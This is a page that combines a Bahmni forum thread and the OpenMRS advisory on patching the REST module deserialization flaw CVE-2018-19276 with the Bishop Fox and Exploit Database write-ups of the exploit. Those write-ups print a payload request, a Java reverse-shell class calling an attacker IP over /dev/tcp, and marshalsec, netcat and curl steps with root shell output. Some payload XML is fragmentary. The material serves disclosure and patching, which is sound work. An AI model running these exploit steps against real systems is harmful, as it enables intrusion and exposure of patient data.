Hi All,

Following the [alert](https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607/1) that there’s a [critical vulnerability in the REST Web Services](https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607/1) module of OpenMRS, I was wondering whether there are any instructions for Bahmni admins to upgrade their deployments to patch the vulnerability?

Is it as simple as downloading a newer OMOD file from the [OpenMRS add-ons page](https://addons.openmrs.org/show/org.openmrs.module.webservices-rest) and installing it into OpenMRS? Will there be a new update for Bahmni and EndTB to patch this issue? If so, when should we expect the patch to be released?

Thanks so much!

We are looking at the compatibility aspects. If APIs (external and internal) are not effected, and dependencies (e.g. EMR API) then yes - its a matter of replacing the module. Request you to try this out (in a safe environment) as well, and please report (direct msg) to [@angshuonline](/u/angshuonline), [@mksd](/u/mksd), [@binduak](/u/binduak).

Also, for reporting any security vulnerability, please do not use public forum and mail to security[at the rate]bahmni[dot]org

As of now, with our testing, we have not come across any compatibility issues.
Our <https://demo-us.mybahmni.org> site has been upgraded with 2.24 version of Webservices REST.
Please consider updating the module.
This would be particularly be important for cloud hosted instances of Bahmni.

We have upgraded Webservices REST to 2.24.0 in few of our implementations having Bahmni core versions 0.89, 0.90, 0.92. We tested our implementations and haven’t come across any compatibility issues.

\*\*Critical Security Advisory CVE-2018-19276: 2019-02-14 \*\*

**Severity:** Critical

**Exploit:** Insecure object deserialization allows Arbitrary Code Execution without needing to log in

IP restrictions on Webservices module do not prevent this attack.

**What versions are affected?**

All versions of OpenMRS with module webservices.rest < 2.24.0 are affected.

That would include:

* all versions of OpenMRS Platform 2.1.x < 2.1.4
* all versions of OpenMRS Platform 2.0.x < 2.0.8
* all versions of OpenMRS Platform 1.12.x < 1.12.1
* all versions of OpenMRS Reference Application 2.8.x < 2.8.1
* all versions of OpenMRS Reference Application 2.7.x < 2.7.2
* all versions of OpenMRS Reference Application 2.6.x < 2.6.2

While OpenMRS Platform versions 1.11.8 and 1.11.9 couldn’t be easily exploited, we strongly recommend treating them as vulnerable as well.

**Recommendations**

1. Make sure your application is not vulnerable anymore:a. Update to version 2.24.0 of the webservices module. [https://wiki.openmrs.org/display/docs/Administering+Modulesb](https://wiki.openmrs.org/display/docs/Administering%2BModulesb). Or upgrade platform or reference application
2. Check your logs for search for the following string: `Failed to convert value of type 'java.util.HashMap' to required type 'org.openmrs.module.webservices.rest.SimpleObject` This log entry would only appear in the logs is as a result of an exploitation attempt.

**Acknowledgements:**

We’d like to thank [Bishopfox](https://www.bishopfox.com/news/2019/02/openmrs-2-5-to-2-8-0-insecure-object-deserialization/), namely researcher Nicola Serra, for finding and reporting this vulnerability. And thanks to [@isears](/u/isears) for providing yet another security fix.

Thanks for jumping all over this (and spamming my twitter feed with all the communication about the vulnerability). I think we need to make this a clearer communication from OpenMRS regarding the detection part, and what is required for those using older versions of the platform? Do they get a patched version or do they have to upgrade ( which is likely to not be feasible, particularly on short notice )? [@burke](/u/burke)

**Vulnerable App:**

```
Insecure Object Deserialization on the OpenMRS Platform
Vulnerability Details
CVE ID: CVE-2018-19276

Access Vector: Remote

Security Risk: Critical

Vulnerability: CWE-502

CVSS Base Score: 10.0

CVSS vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N

JAVA 8 ENVIRONMENT
By injecting an XML payload in the following body request to the REST API provided by the application, an attacker could execute arbitrary commands on the remote system. The request below could be used to exploit the vulnerability:

POST /openmrs/ws/rest/v1/xxxxxx HTTP/1.1
Host: HOST
Content-Type: text/xml

<map>

                   <iter class="java.util.Collections$EmptyIterator"/>
                   <next class="java.lang.ProcessBuilder">
                     <command>

               </serviceIterator>
               <lock/>
             </cipher>
             <input class="java.lang.ProcessBuilder$NullInputStream"/>
             <ibuffer></ibuffer>
             <done>false</done>

       </dataHandler>
       <dataLen>0</dataLen>
     </value>
   </jdk.nashorn.internal.objects.NativeString>
   <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
 </entry>
 <entry>
   <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
   <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
 </entry>

The payload above was generated with the marshalsec tool and adapted to use multiple arguments because the original payload would not work well if the attacker need to send several arguments to a Linux host.. After the payload was sent, the handler successfully received a response:

~ » nc -vlp 8000
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 5DE4 9A26 3868 367D 8104 B043 CE14 BAD6 5CC9 DE51
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 172.16.32.2.
Ncat: Connection from 172.16.32.2:52434.
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/usr/local/tomcat

The response should contain an error message similar to the one below:

{"error":{"message":"[Could not read [class org.openmrs.module.webservices.rest.SimpleObject]; nested exception is org.springframework.oxm.UnmarshallingFailureException: XStream unmarshalling exception; nested exception is com.thoughtworks.xstream.converters.ConversionException: java.lang.String cannot be cast to java.security.Provider$Service
…omitted for brevity…

The response above showed that the REST Web Services module was unable to process the request properly. However, the payload was deserialized before it is caught by the exception handler, which allowed the team to gain shell access.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# OpenMRS - Insecure Object Deserialization

By:
[Nicolas Serra, Senior Security Consultant](https://bishopfox.com/authors/nicolas-serra)

![Gauge reading critical severity](https://assets.bishopfox.com/prod-1437/Images/channels/blog/featured-images/Critical-Risk-Advisory-Featured.jpg)

### Product Description

OpenMRS is a collaborative open-source project through which users can develop software to support healthcare in developing countries. In 2017, OpenMRS was implemented on more than 3,000 sites and stored information for over 8.7 million active patients. The application's official website is <https://openmrs.org>.

### Vulnerabilities List

One vulnerability was identified within the OpenMRS Platform:

* Insecure object deserialization

The vulnerability is described in detail following this summary.

### Impact

This vulnerability is considered as critical because an attacker could gain a shell access to the server without an account or privileges. In addition to that, given the type of information stored in OpenMRS, an exploitation could lead to a leakage of sensitive healthcare data.

### Affected Versions

Versions before and including 2.1.3. All versions of OpenMRS that use the webservices.rest module:
• All versions of OpenMRS Platform 1.10.X
• All versions of OpenMRS Platform 1.11.X except 1.11.8 and 1.11.9
• All versions of OpenMRS Platform 1.12.X
• All versions of OpenMRS Platform 2.0.X
• All versions of OpenMRS Platform 2.1.X

NOTE: As of November 21, 2018, the assessment team does not know why versions 1.11.8 and 1.11.9 are not affected by this vulnerability.

### Solution

Update the webservices.rest module - the vulnerability was addressed in version 2.24.0. (Read OpenMRS instructions [here](https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607).)

We'd like to thank the developers at OpenMRS for working with us in the disclosure process. They were easy to work with, professional, and willing to put in hours during the holiday season to ensure a solution.

## Insecure Object Deserialization on the OpenMRS Platform

### Vulnerability Details

**CVE ID: [CVE-2018-19276](https://nvd.nist.gov/vuln/detail/CVE-2018-19276)**

**Access Vector: Remote**

**Security Risk: Critical**

**Vulnerability: CWE-502**

**CVSS Base Score: 10.0**

**CVSS vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N**

#### Java 8 Environment

By injecting an XML payload in the following body request to the REST API provided by the application, an attacker could execute arbitrary commands on the remote system. The request below could be used to exploit the vulnerability:

```
POST /openmrs/ws/rest/v1/xxxxxx HTTP/1.1

Host: HOST

Content-Type: text/xml
```

<map>
<entry>
<jdk.nashorn.internal.objects.NativeString>

<dataLen>0</dataLen>
</value>
</jdk.nashorn.internal.objects.NativeString>
<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
</entry>
<entry>
<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
</entry>

The payload above was generated with the [marshalsec](https://github.com/mbechler/marshalsec) tool and adapted to use multiple arguments because the original payload would not work well if the attacker need to send several arguments to a Linux host.. After the payload was sent, the handler successfully received a response:

```
~ » nc -vlp 8000

Ncat: Version 7.60 ( https://nmap.org/ncat )

Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.

Ncat: SHA-1 fingerprint: 5DE4 9A26 3868 367D 8104 B043 CE14 BAD6 5CC9 DE51

Ncat: Listening on :::8000

Ncat: Listening on 0.0.0.0:8000

Ncat: Connection from 172.16.32.2.

Ncat: Connection from 172.16.32.2:52434.

id

uid=0(root) gid=0(root) groups=0(root)

pwd

/usr/local/tomcat

```

The response should contain an error message similar to the one below:

```
{"error":{"message":"[Could not read [class org.openmrs.module.webservices.rest.SimpleObject]; nested exception is org.springframework.oxm.UnmarshallingFailureException: XStream unmarshalling exception; nested exception is com.thoughtworks.xstream.converters.ConversionException: java.lang.String cannot be cast to java.security.Provider$Service

…omitted for brevity…

```

The response above showed that the REST Web Services module was unable to process the request properly. However, the payload was deserialized before it is caught by the exception handler, which allowed the team to gain shell access.

#### Java 7 Environment

Java 7 could be used to run OpenMRS, although the payload used in the Java 8 exploit above would not work. However, the Java Development Kit (SDK) offers a gadget to perform the exploitation that would allow an attacker to gain shell access. The [marshalsec](https://github.com/mbechler/marshalsec) tool was used to generate the expected payload.

Unlike the first case, the Java 7 exploitation process was conducted in multiple stages. First, a malicious Java class was written to be injected in the targeted environment. After that, an LDAP server was started on the attacker host to provide the compiled Java class within the response of all requests.

The payload, shown below, was developed as a proof-of-concept (PoC) exploitation class:

```
Exploit.java
public class Exploit {

        static {
                System.err.println("Pwned");
                try {
                        String[] cmd = {"/bin/bash","-c","0<&196;exec 196<>/dev/tcp/172.16.32.3/4444; sh <&196 >&196 2>&196"};
                        java.lang.Runtime.getRuntime().exec(cmd).waitFor();
                } catch ( Exception e ) {
                        e.printStackTrace();
                }
        }
}
```

The waitFor() method is useful because it prevents the application from crashing. The IP address 172.16.32.3 and the port 4444 were connected to the attacker host.

The assessment team, acting as an attacker, had to compile the previous Exploit.java file into a bytecode class file. The following command line was used:

```
~ » /usr/lib/jvm/java-1.7.0-openjdk-amd64/javac Exploit.java
```

The compiled Java class was moved to the /tmp/ (Temp) directory. An attacker would need to start a simple web server on the attacker host. (In this case, the team used Python to do that.)

```
/tmp » python -m SimpleHTTPServer 8000

Serving HTTP on 0.0.0.0 port 8000 ...

```

A listener has been started using the tool Netcat. The port 4444 is the value used in the Exploit.java file previously created.

```
/tmp » nc -vlp 4444

Ncat: Version 7.60 ( https://nmap.org/ncat )

Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.

Ncat: SHA-1 fingerprint: D8E0 2CF8 CC88 1B97 3C11 562F F668 6931 C855 916A

Ncat: Listening on :::4444

Ncat: Listening on 0.0.0.0:4444

```

The team used the marshalsec tool to simulate an LDAP server by using the command line:

```
~ » java -cp /directory/to/marshalsec/application/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.16.32.3:8000/#Exploit"
```

At this time, three terminals opened and everything was configured to provide the malicious class to the targeted application. The issue was exploited using the JdbcRowSet gadget found by @[Matthias\_kaiser](https://twitter.com/matthias_kaiser):

```

The ldap connection string within the file above was changed by the attacker IP address and saved to the location /tmp/ldap.txt.

By using the following cURL command, the payload was sent to the REST API using POST method:

```
/tmp » curl http://172.16.32.4.4/openmrs/ws/rest/v1/concept -H "Content-Type: text/xml" -X POST --data-binary "@/tmp/ldap.txt"
```

On some versions, the payload needs to be sent to an existing endpoint (e.g., /concept) and on others, the payload needs to a non-existing class (e.g., /conxxcept).

The cURL command sent the content of the file located at /tmp/ldap.txt, which contained the gadget. Once the gadget was executed, the Exploit.class file was provided and injected into the targeted application. The execution of the malicious Java file led to remote shell access. Port 4444 of the attacker host received the connection. Note that no error was displayed in the HTTP response:

```
/tmp » nc -vlp 4444
